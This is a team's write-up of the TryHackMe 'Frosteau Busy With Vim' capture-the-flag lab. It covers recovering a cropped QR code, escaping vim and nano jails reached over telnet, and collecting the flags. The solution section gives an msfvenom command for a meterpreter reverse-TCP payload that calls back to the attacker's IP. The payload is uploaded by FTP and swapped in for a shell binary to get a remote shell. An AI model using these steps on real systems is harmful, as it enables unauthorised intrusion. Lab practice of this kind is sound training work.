# Frosteau Busy With Vim (THM Advent of Cyber '23 Side Quest 3 Difficulty: Insane)

This was a team effort with 4 other THM Discord members. 

## Finding the QR Code

To find the QR code that leads to this challenge you need to complete the task in Day 11 (Active Directory Jingle Bells, Shadow Spells) of [THM Advent of Cyber '23](https://tryhackme.com/room/adventofcyber2023). 
1. While still logged in as Van Sprinkles, look through the files and directories available. Cat the chatlogs to see the message history between Van Sprinkles and his boss.
```Van Sprinkles: Hey boss, I was working on the images you requested. What do you think?
Boss: Ah, that will do well enough
Van Sprinkles: But I thought the company was called Best Frostlingval Company or something. Are you sure this works?
Boss: Yes yes yes! It's perfect! And stop sending screenshots of your full screen. You may end up leaking stuff!
Van Sprinkles: Sorry boss! Won't happen again. Hey, I think the logo is upside down
Boss: Shouldn't it be this way?
Van Sprinkles: <i>Deleted Image</i>
Boss: WHAT DID I JUST SAY ABOUT SCREENSHOTS??? You just leaked one of the keys for you-know-who...
Van Sprinkles: Alright, alright. I've deleted it. Here's a cropped version of it
Boss: The original image was fine. Please send it to my email ASAP.
```

2. In the chatlog_files directory you will find the images from the above chat, including the cropped screenshot.
3. Download the screenshots and note the sizes. You will need to resize the cropped image back to it's original size to see the QR code.
4. I used [Acropalypse-Multi-Tool](https://github.com/frankthetank-music/Acropalypse-Multi-Tool) to resize the cropped image.
<p align="left">
  <img height=300 img src=./readme_assets/restored.PNG/>
</p>
5. Scan the QR code and you are in! Welcome to [Frosteau Busy With Vim](https://tryhackme.com/room/busyvimfrosteau)!

## Frosteau Busy With Vim Introduction

<p align="left">
  <img height=100 img src=./readme_assets/challenge.PNG/>
</p>

Heh, well done! You've clawed your way through the CyberPolice's outer defenses. But don't get too cozy yet, you're still a pup in this pack with only limited reach in their network. If you wanna run with the big yetis, you gotta ice Frosteau's machine. That's where the juicy bits hide, all those case files, the whole stash. With that, you'll be howlin' with insight into their network. But keep your eyes peeled; Frosteau's no lone wolf, and with Elf McSkidy by his side, they've snuffed your trail before. Tread light, tread smart, stay frosty!

You are given an IP address and 5 questions to answer.

*Question 1 - What is the content of the first flag?*
*Question 2 - What is the content of the second flag?*
*Question 3 - What is the content of the third flag?*
*Question 4 - What is the content of the fourth flag?*
*Question 5 - What is the content of the `yetikey3.txt` file?*

## Task analysis

If you look at the header image for the challenge you will see several hints.

<p align="left">
  <img height=300 img src=./readme_assets/hints.PNG/>
</p>
 It shows a vim, malware, and docker jail. 

## Solution

The first thing I did was run nmap on the IP address. 
```
22/tcp open ssh  
80/tcp open http 
8065/tcp open unknown
8075/tcp open ftp 
8085/tcp open telnet 
8095/tcp open telnet  
```

We have several ports to check out. Let's start with the most obvious and go to port 80 in a browser.
No web service set up.

Not enough info to get into SSH on 22.
telnet on 8065 kicks you right out.
ftp on 8075 has anonymous login - a good target
telnet on 8085 opens directly into vim - another good target
telnet on 8095 opens directly in nano - and yet another good target

Let's start with ftp. Logging in as anonymous takes you into an unknown directory that contains flags 1 and 2.
<p align="left">
  <img height=200 img src=./readme_assets/ftp2.png/>
</p>

Cat flag 1 for the first flag  

Cat flag 2 and you see `echo $FLAG2`

Telnet into 8085 and run `:echo $FLAG2` in vim for your second flag.

Things found within vim:
```
-If you exit vim you are kicked out of the connection.
-You can see the directories inside vim using `:e /` then `:e /directory_name`.
-Trying to run commands using :! from vim gives an error `Cannot execute shell /tmp/sh`. 
-After looking through many files and directories we determined that /tmp/sh was empty and not executable. 
-There is also a user frosty that has /usr/frosty/sh that is empty but is executable. We might be able to use that to get a shell.
-If you go to the /home directory you will find the user ubuntu.
-We tried all kinds of shells in vim but didn't have any luck.
-We can set permissions with `:call setfperm("/tmp/sh","rwxrwxrwx")`.
-`:e /etc/shells` gives us `/usr/busybox/sh`.
-It seems the 8065 port points to `/usr/frosty/sh`.
```
At this point we decided to try a reverse shell using metasploit in order to get a prompt outside of vim.
```
-Create your payload using `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o payload.elf`.
-Start your listener in `msfconsole` and use `payload/linux/x64/meterpreter/reverse_tcp`, then `set hosts YOUR_IP`.
-ftp to 8075 and upload the payload.elf file.
-telnet to 8095 to use nano to open the payload.elf file at /tmp/ftp/payload.elf and save to /usr/frosry/sh.
-telnet to 8065 and you will now have a meterpreter session. Use sessions -i 1 to get the meterpreter prompt.
```
<p align="left">
  <img height=500 img src=./readme_assets/meterpreter.PNG/>
</p>

You now have a shell. 

Searching for .txt files gives us the third flag, `/root/flag-3-of-4.txt`.


<p align="left">
  <img height=500 img src=./readme_assets/flag3.PNG/>
</p>

After a LOT more searching we determined that there must be another docker container we have to access. Doing a process search for dockerd shows us another user besides ubuntu with dockerd, root.

<p align="left">
  <img height=200 img src=./readme_assets/root.PNG/>
</p>

With this information we were able to find flag 4 and yetikey3.

<p align="left">
  <img height=500 img src=./readme_assets/files.PNG/>
</p>

<p align="left">
  <img height=200 img src=./readme_assets/flags4-5.PNG/>
</p>









